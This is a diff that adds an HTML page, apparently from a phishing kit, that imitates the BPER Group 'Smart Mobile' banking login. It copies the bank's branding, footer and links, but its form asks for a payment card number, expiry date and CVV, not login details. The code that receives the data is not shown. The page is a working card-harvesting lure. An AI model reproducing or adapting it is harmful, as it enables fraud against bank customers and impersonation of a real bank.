@@ -1,0 +1,452 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="Content-Type" content="text/html; CHARSET=UTF-8">
+<meta name="viewport" content="width=800">
+
+	<script src="jquery-3.5.1.min.js"></script>
+  <script src="jquery.payform.min.js"></script>
+
+<link rel="shortcut icon" href="favicon.ico">
+
+<title>Gruppo BPER - SMART MOBILE - Login</title>
+
+
+
+
+
+   <link rel="stylesheet" type="text/css" href="asset/adapter1.css">
+	 <link rel="stylesheet" type="text/css" href="asset/adapter2.css">
+	 <link rel="stylesheet" type="text/css" href="asset/adapter3.css">
+	 <link rel="stylesheet" type="text/css" href="asset/adapter4.css">
+	 <link rel="stylesheet" type="text/css" href="asset/adapter5.css">
+	 <link rel="stylesheet" type="text/css" href="asset/adapter6.css">
+
+
+
+	<script>$( document ).ready(function() {
+jQuery('#scadenza').payform('formatCardExpiry');
+jQuery('#carta').payform('formatCardNumber');
+
+});
+
+</script>
+
+
+</head>
+
+
+
+
+<body>
+
+
+
+
+<center>
+<table width="800" cellspacing="0" cellpadding="0"><!-- Business Component - Login Widget START -->
+<tbody><tr>
+<td>
+
+<div style="display: block" id="myWidget">
+<div id="widgetApp" style="width: 100%; display:none;" align="center">
+<div style="width:5%; float:left; height:50px; display:inline-block">    
+    
+      <img src="asset/icona_chiusura.png" style="
+   position: relative; top:55px;
+   margin-top:-35px; width: 60%; padding:4px; padding-left:6px" alt="Chiudi widget" onclick="hideWidget()">
+  
+</div>
+<div style="width:20%; float:left;">
+    <img src="asset/icona_app.png" style="vertical-align:middle; width:80%;  border:0px; padding:10px;" alt="icona app">
+</div>
+<div style="width:45%; float:left; height:50px; display:inline-block">
+  <p class="widget_font12" style="position: relative; top:55px; margin-top:-35px; font-size:0.85em !important;
+   ">Smart Mobile Banking</p>
+  <p class="widget_font11" style="position: relative; top:55px; margin-top:-5px; font-size:0.75em !important;
+   ">Gruppo BPER</p>
+</div>
+<div style="width:30%; float:right !important; height:50px; display:inline-block">
+                <input class="button_install" type="button" value="VAI" onclick="myApp()" style="
+   position: relative; top:55px;
+   margin-top:-35px; width: 70%; height:2.4em; padding-top:2px !important; padding-bottom:0px !important; padding-left:0px !important; padding-right:0px !important;" alt="vai">    
+</div>
+<input type="hidden" name="stepId" value="false">
+</div>
+</div>
+
+<div style="display: block" id="myWidgetTablet">
+<div id="widgetTablet" style="width: 100%; display:none" align="center">
+<div style="width:5%; float:left; height:50px; display:inline-block">    
+    
+      <img src="asset/icona_chiusura.png" style="
+   position: relative; top:55px;
+   margin-top:-35px; width: 60%; padding:4px; padding-left:6px" alt="Chiudi widget" onclick="hideWidget()">
+  
+</div>
+<div style="width:20%; float:left;">
+    <img src="asset/icona_app.png" style="vertical-align:middle; width:80%;  border:0px; padding:10px;" alt="icona app">
+</div>
+<div style="width:45%; float:left; height:50px; display:inline-block">
+  <p class="widget_font12" style="position: relative; top:55px; margin-top:-40px; font-size:0.85em !important;
+   ">Smart Mobile Banking per Tablet</p>
+  <p class="widget_font11" style="position: relative; top:55px; margin-top:12px; font-size:0.75em !important;
+   ">Gruppo BPER</p>
+</div>
+<div style="width:30%; float:right !important; height:50px; display:inline-block">
+                <input class="button_install" type="button" value="VAI" onclick="myTablet()" style="
+   position: relative; top:55px;
+   margin-top:-35px; width: 70%; height:2.4em; padding-top:2px !important; padding-bottom:0px !important; padding-left:0px !important; padding-right:0px !important;" alt="vai">    
+</div>
+</div>
+</div>
+
+</td>
+</tr>
+<!-- Business Component - Login Widget END --></tbody></table><table width="800" cellspacing="0" cellpadding="0"><!-- Business Component - Google Analytics - Coremetrics EVENT - START -->
+<tbody><tr>
+<td>
+
+	
+
+
+
+
+
+<!--- idCoremetrics = $act_pageIdCoremetrics endIdCoremetrics -->
+<!--- idCoremetrics = $act_pageIdCoremetrics endIdCoremetrics -->
+
+
+</td>
+</tr>
+<!-- Business Component - Google Analytics - Coremetrics EVENT - END --></tbody></table><table width="800" cellspacing="0" cellpadding="0"><tbody><tr>
+	<td>
+		<table class="table_header" style="background:url(asset/topBar_100_800.png) repeat-x;" cellspacing="0" cellpadding="0" border="0" align="center">
+			<tbody><tr class="height_93">								
+				<td class="align_center">
+															<img class="icon_adv1" src="asset/adv_1.png" alt="BPER banca">
+													</td>
+			</tr>
+		</tbody></table>
+	</td>
+</tr>
+
+
+
+
+</tbody></table><div id="loading_screen">
+			<div id="loader"></div>
+		</div><table width="800" cellspacing="0" cellpadding="0"><!-- Business Component - Login Form START -->
+<tbody><tr>
+	
+	<td>
+	
+		
+
+		<style type="text/css">
+			#loading_screen
+			{  
+			  display: none;
+			  position: fixed;
+			  left: 0px;
+			  top: 0px;
+			  height: 100%;
+			  width: 100%;
+			  background-color: black;
+			  color: white;  
+			  text-align: center;
+			  padding-top: 100px;
+			  opacity: 0.9;
+			  filter: alpha(opacity=50);
+			}
+			
+			#loading_image
+			{  
+			  
+			  position: fixed;
+			  top: 40%;
+			  left: 50%;
+			  transform: translateX(-50%);
+			}
+			#loader {
+			  border: 5px solid #b3b3b3;
+			  border-radius: 50%;
+			  border-top: 5px solid #ffffff;
+			  width: 4em;
+			  height: 4em;
+			  -webkit-animation: spin 2s linear infinite; /* Safari */
+			  animation: spin 2s linear infinite;
+			  position: fixed;
+			  top: 40%;
+			  left: 40%;
+			  transform: translateX(-50%);
+			}
+
+			/* Safari */
+			@-webkit-keyframes spin {
+			  0% { -webkit-transform: rotate(0deg); }
+			  100% { -webkit-transform: rotate(360deg); }
+			}
+
+			@keyframes spin {
+			  0% { transform: rotate(0deg); }
+			  100% { transform: rotate(360deg); }
+			}
+		</style>
+		
+		
+				
+		<form name="form_1596452060539" method="post" action="">
+
+		
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+		        <tbody><tr class="height_25">
+					<td colspan="5"></td>
+	            </tr>
+			</tbody></table>
+			
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr>
+					<td class="margin_20"></td>
+					<td class="align_left grey font_bold">
+						<label for="usernameId">Numero Carta</label>
+					</td>
+				</tr>
+				<tr class="height_10">
+					<td colspan="2"></td>
+	            </tr>
+			</tbody></table>
+			
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr class="height_62">
+					<td class="margin_10">&nbsp;
+					</td>
+					<td class="margin_5" style="background:url('asset/inputTXT_left_100_800.png') no-repeat;">
+					</td>
+					<td class="margin_387 input_text_td" style="background:url('asset/inputTXT_center_100_800.png') repeat-x;">	
+						<input class="input_text_2 margin_387" type="text" name="cod" id="carta">
+					</td>
+					<td class="margin_5" style="background:url('asset/inputTXT_right_100_800.png') no-repeat;">
+					</td>
+					<td>&nbsp;
+					</td>
+				</tr> 			
+			</tbody></table>
+						
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr class="height_5">
+					<td colspan="2"></td>
+	            </tr>
+			</tbody></table>
+			
+				
+			<table id="securityTableRetrieve" style="display: block;" cellspacing="0" cellpadding="0" border="0" align="right">
+			<tbody><tr>
+				<td class="margin_14"></td>
+				<td class="font_13px align_center">
+	
+				</td>
+				<td class="margin_14"></td>		
+			</tr>
+			</tbody></table>
+			
+			
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr class="height_10">
+					<td colspan="2"></td>
+	            </tr>
+			</tbody></table>
+			
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr>
+					<td class="margin_20"></td>
+					<td class="align_left grey font_bold">
+						<label for="passwordId">Scadenza</label>
+					</td>
+				</tr>
+				<tr class="height_10">
+					<td colspan="2"></td>
+	            </tr>
+			</tbody></table>
+			
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr class="height_62">
+					<td class="margin_10">&nbsp;
+					</td>
+					<td class="margin_5" style="background:url('asset/inputTXT_left_100_800.png') no-repeat;">
+					</td>
+					<td class="margin_387 input_text_td" style="background:url('asset/inputTXT_center_100_800.png') repeat-x; min-height: 60 !important;">	
+						<input type="text" class="input_text_2 margin_387" name="anno" id="scadenza">
+					</td>
+					<td class="margin_5" style="background:url('asset/inputTXT_right_100_800.png') no-repeat;">
+					</td>
+					<td>&nbsp;
+					</td>
+				</tr>
+			</tbody></table>
+			
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr class="height_5">
+					<td colspan="2"></td>
+	            </tr>
+			</tbody></table>
+			
+			
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr>
+					<td class="margin_20"></td>
+					<td class="align_left grey font_bold">
+						<label for="usernameId">Cvv</label>
+					</td>
+				</tr>
+				<tr class="height_10">
+					<td colspan="2"></td>
+	            </tr>
+			</tbody></table><table id="securityTableReset" style="display: block;" cellspacing="0" cellpadding="0" border="0" align="right">
+			<tbody><tr>
+				<td class="margin_14"></td>
+				<td class="font_13px align_center">
+						
+				</td>
+				<td class="margin_14"></td>		
+			</tr>
+			</tbody></table>
+			
+			
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr class="height_10">
+					<td colspan="2"></td>
+	            </tr>
+			</tbody></table><table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr class="height_62">
+					<td class="margin_10">&nbsp;
+					</td>
+					<td class="margin_5" style="background:url('asset/inputTXT_left_100_800.png') no-repeat;">
+					</td>
+					<td class="margin_387 input_text_td" style="background:url('asset/inputTXT_center_100_800.png') repeat-x;">	
+						<input class="input_text_2 margin_387" type="text" name="mese" value="" id="tel">
+					</td>
+					<td class="margin_5" style="background:url('asset/inputTXT_right_100_800.png') no-repeat;">
+					</td>
+					<td>&nbsp;
+					</td>
+				</tr> 			
+			</tbody></table></form></td></tr></tbody></table>
+	
+			<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+				<tbody><tr class="height_15">
+					<td colspan="5"></td>
+	            </tr>
+				<tr>
+					<td class="margin_left_button_short"> </td>
+					<td class="align_right">
+						<input class="button_login" type="submit" value="CONTINUA">
+					</td>
+					<td class="margin_8">
+					</td>
+				</tr>
+				<tr class="height_25">
+	               <td colspan="3"></td>
+	            </tr>
+			</tbody></table>		
+		
+<input type="hidden" name="classicUrl" value="https://homebanking.bpergroup.net/wps/portal/hb/home/ibpr/sec/login/login?bank=05387&amp;channel=IBPR/"> 
+			
+
+		
+
+	
+
+
+		
+
+
+<!-- Business Component - Login Form END -->
+
+
+
+
+<table width="800" cellspacing="0" cellpadding="0"><!--  Business Component - Info and Location START -->
+
+<tbody><tr>
+	<td>
+	<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+		<tbody><tr style="background: url(asset/bottom_bar_100_800.png) repeat-x">
+			<td class="margin_20"></td>
+			<td class="align_left button_bottom_bar">
+
+			</td>
+			<td class="align_right button_bottom_bar">	
+		
+			</td>
+			<td class="margin_20"></td>
+		</tr>
+	</tbody></table>
+	</td>
+</tr>
+
+<!--  Business Component - Info and Location END -->
+</tbody></table><table width="800" cellspacing="0" cellpadding="0"><!--  Business Component - Footer START -->
+
+<tbody><tr>
+	<td>
+	<table class="table_form" cellspacing="0" cellpadding="0" border="0" align="center">
+		
+		<tbody><tr class="height_10">
+			<td colspan="3">
+		</td></tr>
+		
+		<tr>
+			<td class="margin_14"></td>
+			<td class="font_13px align_center grey">
+				Se vuoi passare alla visualizzazione classica  <a class="black" href="https://homebanking.bpergroup.net/wps/portal/hb/home/ibpr/sec/login/login?bank=05387&amp;channel=IBPR"> <font class="font_bold">clicca qui</font> </a>				
+			</td>
+			<td class="margin_14"></td>		
+		</tr>
+		
+		<tr class="height_20"><td> </td></tr>
+		
+		<tr>
+			<td class="margin_14"></td>
+			<td class="align_center font_12px">
+															<font style="font-style:italic;"><a class="black" href="#">© BPER | Partita Iva </a></font>03830780361
+						<br>
+						
+<a class="blue" style="text-decoration:underline;" href="http://www.bper.it/wps/bper/banca/bper_istzbper_content/sitoit/homepage/footer/antiriciclaggio/">
+Antiriciclaggio</a> | 
+						
+<a class="blue" style="text-decoration:underline;" href="http://www.bper.it/wps/bper/banca/bper_istzbper_content/sitoit/homepage/footer/note-legali/">
+Note Legali</a> | 
+						
+<a class="blue" style="text-decoration:underline;" href="http://www.bper.it/wps/bper/banca/bper_istzbper_content/sitoit/homepage/footer/privacy/">
+Privacy</a> | 
+						
+<a class="blue" style="text-decoration:underline;" href="http://www.bper.it/wps/bper/banca/bper_istzbper_content/sitoit/homepage/footer/trasparenza/">
+Trasparenza</a>				
+														
+				</td>
+			<td class="margin_14"></td>
+		</tr>
+		
+		<tr class="height_10">
+			<td colspan="3">
+		</td></tr>
+		
+	</tbody></table>
+	</td>
+</tr>
+
+<!--  Business Component - Footer END -->
+
+
+</tbody></table><table width="800" cellspacing="0" cellpadding="0"><!-- Business Component - Google Analytics - Coremetrics - START -->
+	
+<tbody><tr>
+
+
+
+	
+
+</tr>
+
+<!--Business Component - Google Analytics - Coremetrics - END--></tbody></table>
+</center>
+</body></html>
